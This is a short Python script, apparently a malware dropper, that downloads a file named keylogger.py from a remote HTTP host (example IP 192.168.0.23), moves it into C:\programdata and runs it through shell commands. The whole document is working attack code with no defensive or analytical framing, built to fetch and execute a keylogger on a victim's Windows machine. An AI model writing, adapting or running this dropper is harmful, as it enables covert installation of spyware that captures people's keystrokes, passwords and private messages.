import subprocess
import requests
import sys

def download_file(file, ip, port):
    # Download the file using requests
    url = f"http://{ip}:{port}/{file}"
    response = requests.get(url)
    
    # Save the downloaded file
    with open(file, "wb") as f:
        f.write(response.content)

    # Move the file to c:\programdata (ensure c:\programdata exists)
    move_command = f'move {file} C:\\programdata'
    execute_keylogger = f'python C:\\programdata\\{file}'

    # Move the file and then execute it
    subprocess.run(move_command, shell=True, capture_output=True, text=True)
    subprocess.run(execute_keylogger, shell=True, capture_output=True, text=True)
    sys.exit(1)

# Example usage
download_file("keylogger.py", "192.168.0.23", "80")
